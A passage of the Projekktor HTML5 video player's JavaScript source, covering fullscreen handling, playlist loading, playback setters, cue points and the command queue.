	    var uagent = navigator.userAgent.toLowerCase();

	    var mobileAgents = ['android', "windows ce", 'blackberry', 'palm', 'mobile'];

	    for (var i=0; i<mobileAgents.length; i++) {
		if (uagent.indexOf(mobileAgents[i])>-1) {
		    // if (uagent.indexOf('webkit')>-1) return false;
		    return (what) ? (mobileAgents[i].toUpperCase()==what.toUpperCase()) : true;
		}
	    }
	    return false;
	};
        
        
       	this.getCanPlay = function(type, platform, streamType) {
	    return this._canPlay(type, platform, streamType);
	}

        /* kept for historical reasons */
	this.getCanPlayNatively = function(type) {
	    return this._canPlay(type, 'native');
	}

	this._canPlay = function(type, platform, streamType) {

            var ref = this,
                checkIn = [],
                checkFor = [],
		st = streamType || 'http',
                pltfrm = (typeof platform=='object') ? platform : [platform],
                type = (type) ? type.replace(/x-/, '') : undefined;

	    if ($p._compTableCache==null) {
		$p._compTableCache = this._testMediaSupport();

	    }

            $.each(pltfrm, function(key, plt) {
     
                $.each($p._compTableCache[st] || [], function(key, val) {
                    if (plt!=null)
                        if (key!=plt)
                            return true;
                    checkIn = $.merge(checkIn, this);                        
                })
            })

	    if (checkIn.length==0)
		return false;

	    switch (typeof type) {

		case 'undefined':
		    return checkIn.length>0

		case 'string':                    
                    if (type=='*')
                        return checkIn;
                    
		    checkFor.push(type);
		    break;

		case 'array':
		    checkFor = type;
		    break;

	    }
            

	    for(var i in checkFor) {
                if (typeof checkFor[i] !== 'string') break;
                if ($.inArray( checkFor[i], checkIn)>-1)
                        return true;
	    }

	    return false;
	};
	
	this.getPlatform = function() {
	    return this.media[this._currentItem].platform  || 'error';
	};

        
        this.getPlatforms = function()  {
            
            var result = [],
                plt = this.getConfig('platforms');

            for (var i=0; i < plt.length; i++ ) {
                try {
                    if ( $p.platforms[plt[i].toUpperCase()]('*') > 0 ) {
                        if (this.getConfig('enable'+plt[i].toUpperCase()+'Platform')===false) continue;		    
                        result.push(plt[i].toUpperCase())
                    }
                } catch(e){};
	    }
            return result;
        };

	/*
	 Thanx to John Dyer: http://johndyer.name/native-fullscreen-javascript-api-plus-jquery-plugin/
	*/
	this.getNativeFullscreenSupport = function() {
	    var ref = this,
		fullScreenApi = {
		    supportsFullScreen: 'semi',
		    isFullScreen: function() {try {return ref.getDC().hasClass('fullscreen');} catch(e){return false;}},
		    requestFullScreen: function() {ref._enterFullViewport(); ref.playerModel.applyCommand('fullscreen', true);},
		    cancelFullScreen: function() {ref._exitFullViewport(); ref.playerModel.applyCommand('fullscreen', false);},
		    prefix: '',
		    ref: this
	    },
	    browserPrefixes = 'webkit moz o ms khtml'.split(' ');

	    // return fullScreenApi;
	    // check for native support

	    // standard conform?
	    if (typeof document.cancelFullScreen != 'undefined') {
		    fullScreenApi.supportsFullScreen = true;
	    } else {

		// (double)-check for fullscreen support by vendor prefix
		for (var i = 0, il = browserPrefixes.length; i < il; i++ ) {

		    fullScreenApi.prefix = browserPrefixes[i];

		    // media element only
		    if (typeof document.createElement('video')[fullScreenApi.prefix+"EnterFullscreen"] != 'undefined') {
			fullScreenApi.supportsFullScreen = 'media';
		    }

		    // player container / true fullscreen
		    if (typeof document[fullScreenApi.prefix + 'CancelFullScreen' ] != 'undefined' ) {
			fullScreenApi.supportsFullScreen = 'dom';

			// FF8+FF9 double-check
			if (fullScreenApi.prefix=='moz' && typeof document[fullScreenApi.prefix + 'FullScreenEnabled'] == 'undefined' )
			    fullScreenApi.supportsFullScreen = false;
		    }

		    if (fullScreenApi.supportsFullScreen!==false && fullScreenApi.supportsFullScreen!=='semi')
			break;

		}
	    }

	    // forget it:
            if (fullScreenApi.supportsFullScreen=='semi' || (fullScreenApi.supportsFullScreen=='dom' && this.getConfig('forceFullViewport')))
		return fullScreenApi;

	    // is in fullscreen check
	    fullScreenApi.isFullScreen = function(esc) {
                /*
                 * FF and GoogleTV report bullshit here:
                 * */
		var dest = (ref.getIframe()) ? parent.window.document : document;
		switch (this.prefix) {
		    case '':
			return dest.fullScreen;
		    case 'webkit':
			return dest.webkitIsFullScreen;
                    case 'moz':
                        return dest[this.prefix + 'FullScreen'] || (ref.getDC().hasClass('fullscreen') && esc!==true);
		    default:                  
			return dest[this.prefix + 'FullScreen'];
		}
		
		
	    }

	    // set initiation method and dest Obj
	    if (fullScreenApi.supportsFullScreen=='dom') {

		// the browser supports true fullscreen for any DOM container - this is ubercool:
		fullScreenApi.requestFullScreen = function() {
                    if (this.isFullScreen()) return;
                    
                    var win = ref.getIframeWindow() || $(window);
                    win.data('fsdata', {
                        scrollTop: win.scrollTop(),
                        scrollLeft: win.scrollLeft()
                    });
                    
		    var target = ref._enterFullViewport(),
			apiRef = this,
			dest = (ref.getIframe()) ? parent.window.document : document,
                        win = ref.getIframeWindow() || $(window);
                                                
		    $(dest).unbind(this.prefix + "fullscreenchange.projekktor");
		    $(dest).bind(this.prefix + "fullscreenchange.projekktor", function(evt) {

			if (!apiRef.isFullScreen(true)) {
                            
                            apiRef.ref._exitFullViewport();
                            apiRef.ref.playerModel.applyCommand('fullscreen', false);
                            
                            var win = apiRef.ref.getIframeWindow() || $(window),
                                fsData = win.data('fsdata');
                            if (fsData!=null) {
                                win.scrollTop(fsData.scrollTop);
                                win.scrollLeft(fsData.scrollLeft);
                            }
                            
			} else {
                            apiRef.ref.playerModel.applyCommand('fullscreen', true);
                        }
		    });

		    if (this.prefix === '')
			target.get(0).requestFullScreen()
		    else
			target.get(0)[this.prefix + 'RequestFullScreen']();
                    
                    apiRef.ref.playerModel.applyCommand('fullscreen', true);
		}

		// cancel fullscreen method
		fullScreenApi.cancelFullScreen = function() {

                    $( (ref.getIframe()) ? parent.window.document : document).unbind(this.prefix + "fullscreenchange.projekktor");
		    var target = ref._exitFullViewport();

		    // $(target).unbind(this.prefix + "fullscreenchange.projekktor");
		    // seems to cause errors in FF		   
                    if (target.exitFullScreen)
                        target.exitFullScreen();
		    else if (this.prefix == '')
			target.cancelFullScreen();
		    else
			target[this.prefix + 'CancelFullScreen']();
                    var win = ref.getIframeWindow() || $(window),
                        fsData = win.data('fsdata');
                    
                    if (fsData!=null) {
                        win.scrollTop(fsData.scrollTop);
                        win.scrollLeft(fsData.scrollLeft);
                    }
                    
                    ref.playerModel.applyCommand('fullscreen', false);
		}

		return fullScreenApi;
	    }


	    // the browser supports true fullscreen for the media element only - this is semi cool
	    fullScreenApi.requestFullScreen = function(el) {
		ref.playerModel.getMediaElement().get(0)[this.prefix+'EnterFullscreen']();
	    }
	    fullScreenApi.dest = {};

	    // cancel fullscreen method
	    fullScreenApi.cancelFullScreen = function() {}

	    return fullScreenApi;
	};

	this.getId = function() {
	    return this._id;
	};

	this.getHasGUI = function() {
	    try {
	        return this.playerModel.getHasGUI();
	    } catch(e) { return false;}
	};

	this.getCssPrefix = this.getNS = function() {
	    return this.config._cssClassPrefix || this.config._ns || 'pp';
	};

	this.getPlayerDimensions = function() {
	    return {width: this.getDC().width(), height: this.getDC().height()};
	};

	this.getMediaDimensions = function() {
	    return this.playerModel.getMediaDimensions() || {width:0, height:0};
	};
        
        this.getAppropriateQuality = function() {
            return this._getAppropriateQuality(this.media[this._currentItem].qualities || [])
        }

	this._getAppropriateQuality = function(quals) {
            
            if (quals.length==0)
                return [];
           
	    var wid = this.env.playerDom.width(),
		hei = this.env.playerDom.height(),
		ratio = $p.utils.roundNumber(wid/hei,2),		
		temp = {};

	    // find best available quality-config-set by "minHeight"
	    $.each( this.getConfig('playbackQualities') || [], function() {

		// not available
		if ($.inArray(this.key, quals)<0)
		    return true;
		
		// check player-dim agains minHeight
		if ( (this.minHeight || 0) > hei && temp.minHeight <= hei)		
		    return true;
		
		// new set in case of higher resolution
		if( (temp.minHeight || 0) > this.minHeight )
		    return true;
		   		    
		// check against minWidth - simple case:
		if (typeof this.minWidth == 'number') {
		    if (this.minWidth===0 && this.minHeight > hei)
			return true;
		    
		    if (this.minWidth > wid)
			return true;
		    
		    temp = this;
		}		
		// check against minWidth - aspect ratio
		else if (typeof this.minWidth == 'object') {
		    var ref = this;
		    $.each(this.minWidth, function() {
			if ( (this.ratio || 100) > ratio)
			    return true;
			if (this.minWidth > wid)
			    return true;
			temp = ref;
			return true;
		    })
		    
		}		
		return true;
	    });

	    return temp.key || 'default';
	};
	
	/* asynchronously loads external XML and JSON data from server */
	this.getFromUrl = function(url, dest, callback, customParser, dataType) {


	    var data = null,
                ref = this,
                aSync = !this.getIsMobileClient();

	    if (dest==ref && callback=='_reelUpdate') {
		this._promote('scheduleLoading', 1+this.getItemCount());
	    }

	    if (callback.substr(0,1)!='_') {
		window[callback] = function(data) {
		    try { delete window[callback]; } catch(e) {}
		    dest[callback](data);
		};
	    } else if (dataType.indexOf('jsonp')>-1) {
		this['_jsonp'+callback] = function(data) {
		    dest[callback](data);
		};
	    }

	    if (dataType) {
		if ($.parseJSON==undefined && dataType.indexOf('json')>-1) {
		    this._raiseError("Projekktor requires at least jQuery 1.4.2 in order to handle JSON playlists.");
		    return this;
		}
		dataType = (dataType.indexOf('/')>-1) ? dataType.split('/')[1] : dataType;
	    }
                
            var ajaxConf = {
                url: url,
                complete: function( xhr, status ) {

                    if (dataType==undefined) {
                        try {
                            if (xhr.getResponseHeader("Content-Type").indexOf('xml')>-1) dataType = 'xml';
                            if (xhr.getResponseHeader("Content-Type").indexOf('json')>-1) dataType = 'json';
                            if (xhr.getResponseHeader("Content-Type").indexOf('html')>-1) dataType = 'html';
                        } catch(e){}
                    }

                    data = $p.utils.cleanResponse(xhr.responseText, dataType)
                    
                    try {data = customParser(data, xhr.responseText, dest);} catch(e){}

                    if (status!='error' && dataType!='jsonp') {
                        try {dest[callback](data);} catch(e){}
                    }
                },
                error: function(data) {

                    // bypass jq 1.6.1 issues
                    if (dest[callback] && dataType!='jsonp'){
                        dest[callback](false);
                    }
                },
                cache: true,
                async: aSync,
                dataType: dataType,
                jsonpCallback: (callback.substr(0,1)!='_') ? false : "projekktor('"+this.getId()+"')._jsonp"+callback,
                jsonp: (callback.substr(0,1)!='_') ? false : 'callback'
            };

            ajaxConf.xhrFields = {withCredentials: true};
            ajaxConf.beforeSend = function(xhr){
                  xhr.withCredentials = true;
            };
   
            $.support.cors = true;
            $.ajax(ajaxConf);            
            

            
	    return this;
	};


	/*******************************
	public (API) methods SETTERS
	*******************************/
	this.setActiveItem = function(mixedData) {

	    var newItem = 0,
                lastItem = this._currentItem,
                ref = this,
		ap = false;

	    if (typeof mixedData=='string') {
		// prev/next shortcuts
		switch(mixedData) {
		    case 'previous':
			newItem = this._currentItem-1;
			break;
		    case 'next':
			newItem = this._currentItem+1;
			break;
		}
	    } else if (typeof mixedData=='number') {
		// index number given
		newItem = parseInt(mixedData);
	    } else {
		// default
		newItem = 0;
	    }


	    // item change requested...
	    if (newItem!=this._currentItem) {
		// and denied... gnehe
		if ( this.getConfig('disallowSkip')==true && (!this.getState('COMPLETED') && !this.getState('IDLE')) ) {
                    return this;
		}
	    }

	    this._detachplayerModel();
	    this.env.loading = false;

	    // do we have an autoplay situation?
	    // regular "autoplay" on:
	    if (newItem===0 && (lastItem==null || lastItem==newItem) && (this.config._autoplay===true || 'DESTROYING|AWAKENING'.indexOf(this.getState())>-1) ) {
		ap = true;
	    }
	    //  "continuous" playback?
	    else if (this.getItemCount()>1 && newItem!=lastItem && lastItem!=null && this.config._continuous===true && newItem<this.getItemCount()) {
		ap = true;
	    }

	    // always "loop" playlist and disallow illegal indexes:
	    if (newItem >= this.getItemCount() || newItem<0) {
		ap = this.config._loop;
		newItem = 0;
	    }

	    // set new item
	    this._currentItem = newItem;

	    // reset player class
	    var wasFullscreen = this.getDC().hasClass('fullscreen');
	    this.getDC().attr('class', this.env.className)
	    if (wasFullscreen) this.getDC().addClass('fullscreen');

	    // create player instance
	    var newModel = this.media[this._currentItem].mediaModel.toUpperCase();

	    // model does not exist or is faulty:
	    if ( !$p.models[newModel] ) {
		newModel='NA';
		this.media[this._currentItem].mediaModel = newModel;
		this.media[this._currentItem].errorCode = 8;
	    } else {
		// apply item specific class(es) to player
		if (this.getConfig('className', null)!=null) 
		    this.getDC().addClass(this.getNS() + this.getConfig('className'))
                
                this.getDC().addClass(this.getNS() + (this.getConfig('streamType') || 'http') );
		if (!$p.utils.cssTransitions()) this.getDC().addClass('notransitions')
                if (this.getIsMobileClient()) this.getDC().addClass('mobile')
	    }

	    // start model:
	    this.playerModel = new playerModel();
	    $.extend(this.playerModel, $p.models[newModel].prototype );

	    this._promote('syncing', 'display');

	    this._enqueue(function() { try {ref._applyCuePoints();} catch(e) {} } );

            this.playerModel._init({
		media: $.extend(true, {}, this.media[this._currentItem]),
		model: newModel,
		pp: this,
		environment: $.extend(true, {}, this.env),
		autoplay: ap,
		quality: this.getPlaybackQuality(),
		fullscreen: this.getInFullscreen()
		// persistent: (ap || this.config._continuous) && (newModel==nextUp)
	    });
	    return this;
	};

	/* queue ready */
	this.setPlay = function() {	    
            var ref = this;            
            if (this.getConfig('thereCanBeOnlyOne')) {
                projekktor('*').each(function() {
                    if (this.getId()!==ref.getId()) {
                        this.setStop();
                    }
                });
            }
            this._enqueue('play', false);
	    return this;
	};

	/* queue ready */
	this.setPause = function() {
	    this._enqueue('pause', false);
	    return this;
	};

	/* queue ready */
	this.setStop = function(toZero) {
	    var ref = this;

	    if (this.getState('IDLE'))
		return this;

	    if (toZero) {
		this._enqueue(function() {
		    ref._currentItem=0;
		    ref.setActiveItem(0);
		});
	    }
	    else
		this._enqueue('stop', false);

	    return this;
	};

	/* queue ready */
	this.setPlayPause = function() {
	    if (!this.getState('PLAYING')) {
		this.setPlay();
	    } else {
		this.setPause();
	    }
	    return this;
	};

	/* queue ready */
	this.setVolume = function(vol, fadeDelay) {
        
	    if (this.getConfig('fixedVolume')==true) {
		return this;
	    }

	    var initalVolume = this.getVolume();            
	    switch (typeof vol) {
		case 'string':
		    var dir = vol.substr(0,1);
		    vol = parseFloat(vol.substr(1));		  
		    switch(dir) {
			case '+':
			    vol = this.getVolume()+vol;
			    break;
			case '-':
			    vol = this.getVolume()-vol;
			    break;
			default:
			    vol = this.getVolume();
		    }		
		case 'number':
                    vol = parseFloat(vol);
		    vol =  (vol>1) ? 1 : vol;
		    vol = (vol<0) ? 0 : vol;		    
		    break;
		default:
		    return this;		
	    }

	    if (vol>initalVolume && fadeDelay) {
		if (vol-initalVolume>0.03) {
		    for(var i=initalVolume; i<=vol; i=i+0.03) {
			this._enqueue('volume', i, fadeDelay);
		    }
		    this._enqueue('volume', vol, fadeDelay);
		    return this;
		}
	    }
	    else if (vol<initalVolume && fadeDelay) {
		if (initalVolume-vol>0.03) {
		    for(var i=initalVolume; i>=vol; i=i-0.03) {
			this._enqueue('volume', i, fadeDelay);
		    }
		    this._enqueue('volume', vol, fadeDelay);
		    return this;
		}
	    }

	    this._enqueue('volume', vol);
	    return this;
	};

   	/* queue ready */
	this.setPlayhead = function(position) {
        
	    if (this.getConfig('disallowSkip')==true)
                return this;
            
	    if (typeof position == 'string') {
		var dir = position.substr(0,1);
		position = parseFloat(position.substr(1));

		if (dir=='+') {
		    position = this.getPosition()+position;
		} else if (dir=='-') {
		    position = this.getPosition()-position;
		} else {
		    position = this.getPosition();
		}
	    }
            
	    if (typeof position == 'number') {
		this._enqueue('seek', position);
	    }
            
	    return this;
	};
        
   	/* queue ready */
	this.setFrame = function(frame) {

            if (this.getConfig('fps')==null)
                return this;
           
	    if (this.getConfig('disallowSkip')==true)
                return this;

	    if (typeof frame == 'string') {
		var dir = frame.substr(0,1);
		frame = parseFloat(frame.substr(1));

		if (dir=='+') {
		    frame = this.getFrame()+frame;
		} else if (dir=='-') {
		    frame = this.getFrame()-frame;
		} else {
		    frame = this.getFrame();
		}
	    }
  
	    if (typeof frame == 'number') {
		this._enqueue('frame', frame);
	    }
            
	    return this;
	};        

	/* queue ready */
	this.setPlayerPoster = function(url) {
	    var ref = this;
	    this._enqueue(function() {ref.setConfig({poster:url},0);});
	    this._enqueue(function() {ref.playerModel.setPosterLive();});
	    return this;
	};

	this.setConfig = function() {
	    var ref = this,
                args = arguments;
                
            this._enqueue(function() {
                ref._setConfig(args[0] || null, args[1] || null)
            });
            
	    return this;
	};

	this._setConfig = function() {

	    if (!arguments.length) {
		return result;
	    }

	    var confObj = arguments[0],
		dest = '*',
		value = false;

	    if (typeof confObj != 'object') {
		return this;
	    }

	    if (arguments[1] == 'string' || arguments[1] == 'number') {
		dest = arguments[1];
	    } else {
		dest = this._currentItem;
	    }

	    for (var i in confObj) {
		// is constant:
		if (this.config['_'+i]!=null) continue;

		try {value = eval(confObj[i]);}
		catch(e) {value = confObj[i];}

		if (dest == '*') {
		    $.each(this.media, function() {
			if (this.config == null) {
			    this.config = {};
			}
			this.config[i] = value;
		    });
		    continue;
		}

		if (this.media[dest] == undefined) return this;

		if (this.media[dest]['config'] == null) {
		    this.media[dest]['config'] = {};
		}

		this.media[dest]['config'][i] = value;
	    }
	    return this;
	};

	this.setFullscreen = function(goFull) {

            if (this.getConfig('isCrossDomain'))
                return this;

	    var nativeFullscreen = this.getNativeFullscreenSupport(),
		ref = this;

	    goFull = (goFull==null) ? !nativeFullscreen.isFullScreen() : goFull;                                

	    if (goFull===true) nativeFullscreen.requestFullScreen();
	    else nativeFullscreen.cancelFullScreen();

            return this;
        };

	this.setSize = function(data) {
        
        if (this.getInFullscreen())
            return;
        

        var w = (data && data.width!=null) ? data.width : 
                (this.getConfig('width')!=null) ? this.getConfig('width') : false,
                
            h = (data && data.height!=null) ? data.height :
                (this.getConfig('height')==null && this.getConfig('ratio')) ? Math.round( (w || this.getDC().width()) / this.getConfig('ratio')) :
                (this.getConfig('height')!=null) ? this.getConfig('height') : false;

        if (this.getConfig('iframe')) {
            w = $(window).width();
            h = $(window).height()
        }

        // apply width
        if (w) this.getDC().css({width:  w + "px" });
        if (h) this.getDC().css({height: h + "px" });

        try { this.playerModel.applyCommand('resize'); } catch(e) {}
  
	};

	this.setLoop = function(value) {
	    this.config._loop = value || !this.config._loop;
	};

	this.setDebug = function(value) {
            $p.utils.logging = value || !$p.utils.logging;
            if ($p.utils.logging)
                $p.utils.log('DEBUG MODE for player #' + this.getId());
	};

	this.addListener = function(evt, callback) {
	    var ref=this;
	    this._enqueue(function() {ref._addListener(evt, callback)});
	    return this;
	};
	this._addListener = function(event, callback) {
	    var evt = (event.indexOf('.')>-1) ? event.split('.') : [event, 'default'];
            this.listeners.push({
                event: evt[0],
                ns: evt[1],
                callback: callback
            });            
	    return this;
	};


	/* removes an JS object from the bubble-event queue */
	this.removeListener = function(event, callback) {
            
	    var len = this.listeners.length,
                evt = (event.indexOf('.')>-1) ? event.split('.') : [event, '*'];

	    for (var i=0; i<len;i++) {
		if (this.listeners[i]==undefined) continue;
		if (this.listeners[i].event!=evt[0] && evt[0]!=='*') continue;                
                if ( (this.listeners[i].ns!=evt[1] && evt[1]!=='*') || (this.listeners[i].callback!=callback && callback!=null) ) continue;		
                this.listeners.splice(i,1);
	    }
	    return this;
	};

	this.setItem = function() {
	    // arg0 -> item obj
	    // arg1 -> position (int)
	    // arg2 -> replace (bool)

	    var itemData = arguments[0];
	    var affectedIdx = 0;

	    this._clearqueue();
	    
            // if (this.env.loading===true) {
		// return this;
	    // }

	    if (itemData==null) {
		// remove item
		affectedIdx = this._removeItem(arguments[1]);
		if (affectedIdx===this._currentItem) {
		    this.setActiveItem('previous');
		}
	    }
	    else {
		// add/set item
		affectedIdx = this._addItem( this._prepareMedia({file:itemData, config:itemData.config || {}}), arguments[1], arguments[2]);
		if (affectedIdx===this._currentItem) {
		    this.setActiveItem(this._currentItem);
		}
	    }

	    return this;
	};

	this.setFile = function() {

	    var fileNameOrObject = arguments[0] || '',
		dataType = arguments[1] || this._getTypeFromFileExtension( fileNameOrObject ),
		result = [];

	    if (this.env.loading===true)
                return this;
            
	    this._clearqueue();
	    this.env.loading = true;
	    this._detachplayerModel();

	    // incoming JSON
	    if (typeof fileNameOrObject=='object') {
		$p.utils.log('Applying incoming JS Object', fileNameOrObject);
		this._reelUpdate(fileNameOrObject);
		return this;
	    }

	    result[0] = {};
	    result[0].file = {}
	    result[0].file.src = fileNameOrObject || '';
	    result[0].file.type = dataType || this._getTypeFromFileExtension( splt[0] ) ;

	    // incoming playlist
	    if (result[0].file.type.indexOf('/xml')>-1 || result[0].file.type.indexOf('/json') >-1) {
		$p.utils.log('Loading external data from '+result[0].file.src+' supposed to be '+result[0].file.type );
		this._playlistServer = result[0].file.src;
		this.getFromUrl(result[0].file.src, this, '_reelUpdate', this.getConfig('reelParser'), result[0].file.type );
		return this;
	    }

	    // incoming single file:
	    $p.utils.log('Applying incoming single file:'+result[0].file.src, result);
	    this._reelUpdate(result);
	    return this;
	};

	this.setPlaybackQuality = function(quality) {
	    var qual = quality || this.getAppropriateQuality();         
	    if ($.inArray(qual, this.media[this._currentItem].qualities || [])>-1) {
		this.playerModel.applyCommand('quality', qual);
                this.setConfig({playbackQuality: qual});	
            }
		
	    return this;

	};

	this.openUrl = function(cfg) {
	    cfg = cfg || {url:'', target:'', pause: false};
	    if (cfg.url=='') return;
	    if (cfg.pause===true) {
		this.setPause();
	    }
	    window.open(cfg.url, cfg.target).focus();
	    return this;
	};


	/**
	* Removes THIS Projekktor and reconstructs original DOM
	*
	* ENQUEUED
	*
	* @public
	* @return {Object} this
	*/
	this.selfDestruct = this.destroy = function() {
	    var ref = this;
	    this._enqueue(function() {ref._destroy();});
	    return this;
	},
        
	this._destroy = function() {

	    var ref = this;
	    
            $(this).unbind();
            
	    this.removePlugins();
            this.playerModel.destroy();            
	    this._removeGUIListeners();


	    $.each(projekktors, function(idx) {
		try {
		    if (this.getId() == ref.getId() || this.getId() == ref.getId() || this.getParent() == ref.getId())  {
			projekktors.splice(idx, 1);
			return;
		    }
		} catch(e){}
	    });

	    this.env.playerDom.replaceWith( this.env.srcNode );
     
            this._promote('destroyed')
            this.removeListener('*');
            
	    return this;
	}

	/**
	* @public
	* @return {Object} this
	*/
	this.reset = function() {
	    var ref = this;
	    this.setFullscreen(false);
	    this._clearqueue();
	    this._enqueue(function() {ref._reset();});
	    return this;
	},

	this._reset = function() {

	    var cleanConfig = {},
                ref = this;
              
	    this.setFullscreen(false);
	    
	    $(this).unbind();
	    $((this.getIframe()) ? parent.window.document : document).unbind(".projekktor");
	    $(window).unbind('.projekktor'+this.getId());

            this.playerModel.destroy();
            this.playerModel = {};
            
	    this.removePlugins();
	    this._removeGUIListeners();
	    this.env.mediaContainer = null;
	    this._currentItem = null;

	    for (var i in this.config) {
		cleanConfig[(i.substr(0,1)=='_') ? i.substr(1) : i] = this.config[i];
	    }

	    if (typeof this.env.onReady==='function') {
		this._enqueue(ref.env.onReady(ref));
	    }

	    this._init(this.env.playerDom, cleanConfig);

	    return this;
	},


 	/********************************************************************************************
		Queue Points
	*********************************************************************************************/
	this.setCuePoint = function(obj, opt) {
	    var item = (obj.item!==undefined) ? obj.item : this.getItemIdx(),
                options = $.extend(true, {
                    offset: 0
                }, opt),
		ref = this,
		cuePoint = {
		    id: obj.id || $p.utils.randomId(8),
		    group: obj.group || $p.utils.randomId(8),
		    item: item,
		    on: ($p.utils.toSeconds(obj.on) || 0) + options.offset,
		    off: ($p.utils.toSeconds(obj.off) || $p.utils.toSeconds(obj.on) || 0)  + options.offset,
		    value: obj.value || null,
		    callback: obj.callback || function(){},
                    precision: (obj.precision==null) ? 1 : obj.precision,
		    title: (obj.title==null) ? '' : obj.title,
		    
                    _listeners: [],
                    _unlocked: false,
		    _active: false,
		    _lastTime: 0,
                        
                    isAvailable: function() {return this._unlocked;},
                    
		    _stateListener: function(state, player) {
			if ('STOPPED|COMPLETED|DESTROYING'.indexOf(state)>-1) {
			    if (this._active)
				try {  this.callback(false, this, player); } catch(e) {}
			    this._active = false;
                            this._lastTime = -1;
			}

		    },
		    _timeListener: function(time, player) {

                        if (player.getItemIdx()!==this.item && this.item!='*')
                            return;
                        
			var timeIdx = (this.precision==0) ? Math.round(time) : $p.utils.roundNumber(time, this.precision),                           
                            ref = this;

                        // are we already unlocked?
                        // consider buffer state to unlock future cuepoints for user interactions
                        if (this._unlocked===false) {
                            var approxMaxTimeLoaded = player.getDuration() * player.getLoadProgress() / 100;
                       
                            if (this.on<=approxMaxTimeLoaded || this.on<=timeIdx ) {
                                
                                // trigger unlock-listeners
                                $.each(this._listeners['unlock'] || [], function() {			
                                    this(ref, player);
                                })
                                
                                this._unlocked = true;
                                
                            } else { return; }
                            
                        }

                        // something to do?
			if (this._lastTime==timeIdx)
			    return;

			var nat = (timeIdx-this._lastTime<=1 && timeIdx-this._lastTime>0);

			// trigger ON
			if ( ( (timeIdx >= this.on && timeIdx <= this.off) || (timeIdx >= this.on && this.on == this.off && timeIdx <= this.on+1) ) && this._active!==true) {			   
                            
                            this._active = true;
			    $p.utils.log("Cue Point: [ON " + this.on +"] at "+timeIdx,  this);
			    try { this.callback({
                                id: this.id,
                                enabled: true,
                                value: this.value,
                                seeked: !nat,
                                player: player}); } catch(e) {}
			}
			
                        // trigger OFF
			else if ( (timeIdx < this.on || timeIdx > this.off) && this.off!=this.on && this._active==true) {
		            this._active = false;
                            $p.utils.log("Cue Point: [OFF] at " + this.off, this);
                            try { this.callback({
                                id: this.id,
                                enabled: false,
                                value: this.value,
                                seeked: !nat,
                                player: player}); } catch(e) {}                                    
			}                        
                        
                        if ( this.off==this.on && this._active && new Number(timeIdx-this.on).toPrecision(this.precision)>=1 ) {
                            this._active = false;
                        }

			this._lastTime = timeIdx;
		    },
                    addListener: function(event, func) {
                        if (this._listeners[event]==null)
                            this._listeners[event] = [];
                        this._listeners[event].push( func || function(){} );
                    }
		}

            if(obj.unlockCallback!=null)
                cuePoint.addListener('unlock', obj.unlockCallback);
                
	    // create itemidx key
	    if (this._cuePoints[item]==null)
		this._cuePoints[item] = [];

	    this._cuePoints[item].push(cuePoint);
	    
	    if (!this.getState('IDLE'))
		this._promote('cuepointAdded')
	    
	    return this;

	},
        
	this.setGotoCuePoint = function(idx, itemIdx) {
            var cuePoints = this.getCuePoints(itemIdx);
            this.setPlayhead(cuePoints[idx].on);
	    return this;
	},        

	this.getCuePoints = function(idx) {            
	    return this._cuePoints[ idx || this.getItemIdx() ] || this._cuePoints || {};
	},

	this.getCuePointById = function(id, idx) {
    
            var result = false,
                cuePoints = this.getCuePoints(idx);
            
            for (var j=0; j<cuePoints.length; j++){
                if (cuePoints.id==id) {
                    result = this;
                    break;
                }
            }

	    return result;
	},

	this.removeCuePoints = function(idx, group) {
	    var cuePoints = this.getCuePoints(idx) || {},
		kill = [];
		
            for (var cIdx=0; cIdx < cuePoints.length; cIdx++ ) {
		if (cuePoints[cIdx].group==group) {
		    this.removeListener('time', cuePoints[cIdx].timeEventHandler);
		    this.removeListener('state', cuePoints[cIdx].stateEventHandler);		    
		    kill.push(cIdx);
		}
            }

	    for (var i = 0; i < kill.length; i++) {
		cuePoints.splice(kill[i] - i, 1);	    
	    }
            return this;
	},
	
	this.syncCuePoints = function() {
	    var ref = this;
	    this._enqueue(function() { try {ref._applyCuePoints();} catch(e) {} } );
            return this;
	},

	this._applyCuePoints = function(resync) {

	    var ref = this;

	    if (this._cuePoints[this._currentItem]==null && this._cuePoints['*']==null) {
		return;
	    }

	    $.each( $.merge(this._cuePoints[this._currentItem] || [], this._cuePoints['*'] || []), function(key, cuePointObj) {

		try {
		    ref.removeListener('time', cuePointObj.timeEventHandler);
		    ref.removeListener('state', cuePointObj.stateEventHandler);
		} catch(e) {}
	    
		cuePointObj.timeEventHandler = function(time, player) {
		    try {cuePointObj._timeListener(time, player);} catch(e){}
		},

		cuePointObj.stateEventHandler = function(state, player) {
		    try {cuePointObj._stateListener(state, player);} catch(e){}
		},


		ref.addListener('time', cuePointObj.timeEventHandler);
		ref.addListener('state', cuePointObj.stateEventHandler);

		ref.addListener('item', function() {
		    ref.removeListener('time', cuePointObj.timeEventHandler);
		    ref.removeListener('state', cuePointObj.stateEventHandler);
		});

	    })

	},


 	/********************************************************************************************
		Command Queue
	*********************************************************************************************/
	this._enqueue = function(command, params, delay)  {
	    if (command!=null) {
                this._queue.push({command:command, params:params, delay:delay});
                this._processQueue();
            }
	};

	this._clearqueue = function(command, params)  {
	    if (this._isReady===true) {
                this._queue = [];
            }
	};

	this._processQueue = function() {
	    var ref = this,
                modelReady = false;
                
	    if (this._processing===true || this.env.loading===true) return;	    
	    this._processing = true;

	    (function() {
		try {modelReady=ref.playerModel.getIsReady();} catch(e) {}
		if (ref.env.loading!==true && modelReady) {

		    try {
			var msg = ref._queue.shift();
			if (msg!=null) {
			    if (typeof msg.command=='string') {
				if (msg.delay>0)
				    setTimeout(function() {
					ref.playerModel.applyCommand(msg.command, msg.params);
				    }, msg.delay);
				else
				    ref.playerModel.applyCommand(msg.command, msg.params);
			    } else {
				msg.command(ref);
			    }
			}
		    } catch(e) {console.log(e)}

		    if (ref._queue.length==0){
			if (ref._isReady===false ) {
			    // ref._promote('ready', ref.getItemIdx());
			    ref._isReady=true;
			}
			ref._processing = false;
			return;
		    }

		    arguments.callee();
		    return;
		}
		setTimeout(arguments.callee,100);
	    })();
	}


	/********************************************************************************************
		GENERAL Tools
	*********************************************************************************************/
	this._getTypeFromFileExtension = function(url) {

	    var fileExt = '',
                extRegEx = [],
                extTypes = {},
                extRegEx = [];

	    // build regex string and filter dublicate extensions:
	    for(var i in $p.mmap ) {
		extRegEx.push( '\\\.'+$p.mmap [i].ext );
		extTypes[$p.mmap [i].ext] = $p.mmap [i];
	    }
            
	    extRegEx = '^.*\.('+extRegEx.join('|')+")";

	    try {
		fileExt = url.match( new RegExp(extRegEx))[1];
		fileExt = (!fileExt) ? 'NaN' : fileExt.replace('.','');
